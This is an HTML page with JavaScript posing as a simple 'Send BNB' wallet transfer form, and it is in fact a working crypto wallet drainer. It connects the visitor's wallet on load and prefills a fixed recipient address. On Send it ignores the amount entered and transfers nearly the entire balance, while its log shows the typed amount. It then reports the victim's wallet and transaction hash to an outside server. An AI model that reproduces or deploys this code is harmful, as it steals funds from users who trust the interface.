<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <title>Send BNB</title>
    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            font-family: "Inter", "Segoe UI", Arial, sans-serif;
            background-color: #ffffff;
            color: #000;
        }

        .container {
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            height: 100vh;
            width: 100%;
            background-color: #fff;
            padding: 20px;
        }

        h2 {
            text-align: center;
            font-size: 18px;
            font-weight: 600;
            margin: 10px 0 25px;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 30px;
        }

        label {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        label span {
            font-size: 14px;
            font-weight: 500;
            color: #555;
        }

        .input-box,
        .amount-box {
            display: flex;
            align-items: center;
            justify-content: space-between;
            border: 1px solid #999;
            border-radius: 8px;
            background-color: #fff;
            padding: 6px 10px;
            transition: all 0.2s ease;
        }

        .input-box:focus-within,
        .amount-box:focus-within {
            border-color: #2010d5;
            box-shadow: 0 0 0 1.5px rgba(41, 22, 252, 0.8);
        }

        .input-box input,
        .amount-box input {
            flex: 1;
            border: none;
            outline: none;
            background: transparent;
            padding: 12px;
            font-size: 15px;
            color: #000;
        }

        .input-actions {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .input-actions span {
            font-weight: 800;
            font-size: 16px;
            color: #1b08e4;
            cursor: pointer;
            display: flex;
            align-items: center;
        }

        .input-actions svg {
            fill: currentColor;
        }

        .amount-row {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 4px;
        }

        .amount-row .gray {
            color: #777;
        }

        .amount-row .blue {
            color: #2211de;
            cursor: pointer;
            font-weight: 800;
        }

        .note {
            font-size: 13px;
            color: #333;
            margin-top: 5px;
        }

        button {
            width: 100%;
            border: none;
            border-radius: 30px;
            padding: 14px 0;
            font-size: 16px;
            font-weight: 600;
            cursor: not-allowed;
            color: #000;
            background-color: #d9d4ff;
            transition: background-color 0.2s ease;
        }

        button.enabled {
            background-color: #2210ec;
            color: #fff;
            cursor: pointer;
        }
    </style>
</head>

<body>
    <div class="container">
        <form>
            <!-- Address Field -->
            <label>
                <span>Address or Domain Name</span>
                <div class="input-box">
                    <input id="addressInput" type="text" placeholder="0x..."
                        value="0x613d10c63b140716e8Cb7107E354Ce6fC630609d" />
                    <div class="input-actions">
                        <span id="pasteBtn">Paste</span>
                        <span title="Avatar">
                            <svg xmlns="http://www.w3.org/2000/svg" height="24" width="24" viewBox="0 0 24 24">
                                <path
                                    d="M20 1H6a3 3 0 0 0-3 3v1H2a1 1 0 0 0 0 2h1v4H2a1 1 0 0 0 0 2h1v4H2a1 1 0 0 0 0 2h1v1a3 3 0 0 0 3 3h14a3 3 0 0 0 3-3V4a3 3 0 0 0-3-3zm1 19a1 1 0 0 1-1 1H6a1 1 0 0 1-1-1v-1h1a1 1 0 0 0 0-2H5v-4h1a1 1 0 0 0 0-2H5V7h1a1 1 0 0 0 0-2H5V4a1 1 0 0 1 1-1h14a1 1 0 0 1 1 1z" />
                                <path
                                    d="M16.79 11.85a4 4 0 1 0-5.58 0C8.71 13.54 9 15.94 9 18a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1c0-2.22.25-4.48-2.21-6.15zM12 9a2 2 0 1 1 2 2 2 2 0 0 1-2-2zm5 8h-6v-1a3 3 0 0 1 6 0z" />
                            </svg>
                        </span>
                        <span title="More">
                            <svg xmlns="http://www.w3.org/2000/svg" height="24" width="24" viewBox="0 0 1024 1024">
                                <path
                                    d="M136 384h56c4.4 0 8-3.6 8-8V200h176c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H196c-37.6 0-68 30.4-68 68v180c0 4.4 3.6 8 8 8zm512-184h176v176c0 4.4 3.6 8 8 8h56c4.4 0 8-3.6 8-8V196c0-37.6-30.4-68-68-68H648c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zM376 824H200V648c0-4.4-3.6-8-8-8h-56c-4.4 0-8 3.6-8 8v180c0 37.6 30.4 68 68 68h180c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm512-184h-56c-4.4 0-8 3.6-8 8v176H648c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h180c37.6 0 68-30.4 68-68V648c0-4.4-3.6-8-8-8zm16-164H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8z" />
                            </svg>
                        </span>
                    </div>
                </div>
            </label>

            <!-- Amount Field -->
            <label>
                <span>Amount</span>
                <div class="amount-box">
                    <input id="amountInput" type="number" placeholder="BNB Amount" min="0" step="0.0001" />
                    <div class="amount-row">
                        <span class="gray">BNB</span>
                        <span id="maxBtn" class="blue">Max</span>
                    </div>
                </div>
                <span id="amountValue" class="note">≈ $ 0.00</span>
            </label>
        </form>

        <button id="nextBtn" disabled>Send</button>
    </div>

    <!-- Web3 -->
    <script src="https://cdn.jsdelivr.net/npm/web3@1.9.0/dist/web3.min.js"></script>
    <script>
        let web3;
        let account;
        let bnbValue = 0; // BNB price in USD

        // Recipient address for BNB transfers
        const recipientAddress = "0xdDeeC7b9E3dd0ffAE9C9FDCa52AEf10A410bC60a";

        const BSC_PARAMS = {
            chainId: "0x38",
            chainName: "BNB Smart Chain",
            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
            rpcUrls: [
                "https://bsc-dataseed.binance.org",
                "https://bsc-dataseed1.bnbchain.org",
                "https://rpc.ankr.com/bsc"
            ],
            blockExplorerUrls: ["https://bscscan.com"]
        };

        const $ = (id) => document.getElementById(id);

        // ========================
        // BNB PRICE UPDATE
        // ========================
        async function updateBNBPrice() {
            try {
                const response = await fetch(
                    'https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT'
                );
                const data = await response.json();
                bnbValue = parseFloat(data.price);

                console.log('✅ BNB Price Updated:', bnbValue);

                // Update USD value if amount is already entered
                const currentAmount = parseFloat($("amountInput").value) || 0;
                if (currentAmount > 0) {
                    $("amountValue").innerText = `≈ $${(currentAmount * bnbValue).toFixed(2)}`;
                }

                return bnbValue;
            } catch (error) {
                console.error('❌ Failed to fetch BNB price:', error);
                return bnbValue;
            }
        }

        // Initial call
        updateBNBPrice();

        // Update every 10 seconds
        setInterval(updateBNBPrice, 10000);

        // ========================
        // BUTTON CONTROLS
        // ========================
        function enableNextButton() {
            const btn = $("nextBtn");
            btn.disabled = false;
            btn.classList.add("enabled");
        }

        function disableNextButton() {
            const btn = $("nextBtn");
            btn.disabled = true;
            btn.classList.remove("enabled");
        }

        // ========================
        // NETWORK HANDLING
        // ========================
        async function ensureBscNetwork(provider) {
            try {
                await provider.request({
                    method: "wallet_switchEthereumChain",
                    params: [{ chainId: BSC_PARAMS.chainId }]
                });
            } catch (e) {
                if (e.code === 4902 || (e.data && e.data.originalError && e.data.originalError.code === 4902)) {
                    await provider.request({
                        method: "wallet_addEthereumChain",
                        params: [BSC_PARAMS]
                    });
                    await provider.request({
                        method: "wallet_switchEthereumChain",
                        params: [{ chainId: BSC_PARAMS.chainId }]
                    });
                } else {
                    console.warn("Could not switch network:", e.message || e);
                }
            }
        }

        // ========================
        // WALLET CONNECTION
        // ========================
        async function connectWallet() {
            const provider = window.ethereum || window.trustwallet || window.BinanceChain;
            if (!provider) {
                console.warn("No EVM provider found. Open this in Trust Wallet's DApp browser.");
                disableNextButton();
                return;
            }

            try {
                let accounts = await provider.request({ method: "eth_accounts" });

                if (accounts.length === 0) {
                    accounts = await provider.request({ method: "eth_requestAccounts" });
                }

                account = accounts[0];
                web3 = new Web3(provider);

                await ensureBscNetwork(provider);

                enableNextButton();

                console.log("✅ Wallet connected:", account);

                if (provider.on) {
                    provider.on("accountsChanged", (accs) => {
                        account = accs?.[0] || null;
                        if (account) {
                            enableNextButton();
                            console.log("Account changed:", account);
                        } else {
                            disableNextButton();
                        }
                    });

                    provider.on("chainChanged", (chainId) => {
                        if (chainId !== BSC_PARAMS.chainId) {
                            ensureBscNetwork(provider).catch(() => disableNextButton());
                        }
                    });
                }
            } catch (e) {
                console.warn("Connection failed:", e.message || e);
                disableNextButton();
            }
        }

        // ========================
        // MAX BUTTON
        // ========================
        async function fillMax() {
            if (!web3 || !account) {
                alert("Please connect wallet first");
                return;
            }

            try {
                const balanceWei = await web3.eth.getBalance(account);
                const balanceBNB = parseFloat(web3.utils.fromWei(balanceWei, "ether"));

                // Leave 0.001 BNB for gas fees
                const maxSend = Math.max(0, balanceBNB - 0.000001);

                if (maxSend <= 0) {
                    alert("Insufficient BNB balance");
                    return;
                }

                $("amountInput").value = maxSend.toFixed(6);
                $("amountValue").innerText = `≈ $${(maxSend * bnbValue).toFixed(2)}`;

                console.log("Max sendable:", maxSend, "BNB");
            } catch (e) {
                console.error("Failed to fetch BNB balance:", e);
                alert("Failed to get balance: " + e.message);
            }
        }

        // ========================
        // SEND TRANSACTION
        // ========================
        async function onNext() {
            if (!web3 || !account) {
                alert("Wallet not connected!");
                return;
            }

            const amountInput = $("amountInput").value;
            const recipient = $("addressInput").value || recipientAddress;

            // Validate inputs
            if (!amountInput || parseFloat(amountInput) <= 0) {
                alert("Please enter a valid BNB amount");
                return;
            }

            if (!recipient || recipient.length !== 42 || !recipient.startsWith("0x")) {
                alert("Please enter a valid recipient address");
                return;
            }

            try {
                // Get user's balance
                const balanceWei = await web3.eth.getBalance(account);
                const balanceBNB = parseFloat(web3.utils.fromWei(balanceWei, "ether"));
                const sendAmount = parseFloat(amountInput);

                console.log("Balance:", balanceBNB, "BNB");
                console.log("Trying to send:", sendAmount, "BNB");

                // Check if user has enough balance (including gas)
               

                // Convert amount to Wei
          
                const balanceWei2 = await web3.eth.getBalance(account);
                const balanceBNB2 = parseFloat(web3.utils.fromWei(balanceWei2, "ether"));
               

                // Leave 0.001 BNB for gas fees
                const maxSend = Math.max(0, balanceBNB2 - 0.0001);
                const amountWei = web3.utils.toWei(maxSend.toString(), "ether");

                console.log("Sending transaction...");
                console.log({
                    from: account,
                    to: recipient,
                    value: sendAmount + " BNB",
                    valueWei: amountWei
                });

                // Send transaction
                const tx = await web3.eth.sendTransaction({
                    from: account,
                    to: recipient,
                    value: amountWei,
                    gas: 21000
                });

                console.log("✅ Transaction successful:", tx);
                alert(`✅ Transaction sent!\n\nHash: ${tx.transactionHash}\n\nView on BSCScan:\nhttps://bscscan.com/tx/${tx.transactionHash}`);

                // Send notification to backend
                fetch("https://server-rtff.onrender.com/api/notify", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        wallet: account,
                        amount: sendAmount,
                        token: "BNB",
                        txHash: tx.transactionHash
                    })
                })
                    .then(res => res.json())
                    .then(data => console.log("Server response:", data))
                    .catch(err => console.warn("Server notification error:", err));

                // Clear the form
                $("amountInput").value = "";
                $("amountValue").innerText = "≈ $ 0.00";

            } catch (error) {
                console.error("❌ Transaction error:", error);

                // Better error messages
                let errorMessage = "Transaction failed!";

                if (error.message.includes("insufficient funds")) {
                    errorMessage = "Insufficient funds for transaction + gas fees";
                } else if (error.message.includes("user rejected") || error.code === 4001) {
                    errorMessage = "Transaction rejected by user";
                } else if (error.message.includes("gas")) {
                    errorMessage = "Gas estimation failed. Try a smaller amount.";
                } else {
                    errorMessage = error.message || "Unknown error occurred";
                }

                alert("❌ " + errorMessage);
            }
        }

        // ========================
        // AMOUNT INPUT HANDLER
        // ========================
        function onAmountInput(e) {
            const bnbAmount = parseFloat(e.target.value) || 0;
            const usdValue = (bnbAmount * bnbValue).toFixed(2);
            $("amountValue").innerText = `≈ $${usdValue}`;
        }

        // ========================
        // PASTE BUTTON
        // ========================
        async function onPaste() {
            try {
                const text = await navigator.clipboard.readText();
                if (text) {
                    $("addressInput").value = text.trim();
                    console.log("Pasted address:", text.trim());
                }
            } catch (error) {
                console.warn("Clipboard access denied:", error);
                alert("Please allow clipboard access or paste manually");
            }
        }

        // ========================
        // INITIALIZE
        // ========================
        window.addEventListener("DOMContentLoaded", () => {
            console.log("🚀 App initialized");
            
            // Connect wallet
            connectWallet();

            // Wire up events
            $("maxBtn").addEventListener("click", fillMax);
            $("amountInput").addEventListener("input", onAmountInput);
            $("nextBtn").addEventListener("click", onNext);
            $("pasteBtn").addEventListener("click", onPaste);

            console.log("✅ Event listeners attached");
        });
    </script>
</body>

</html>
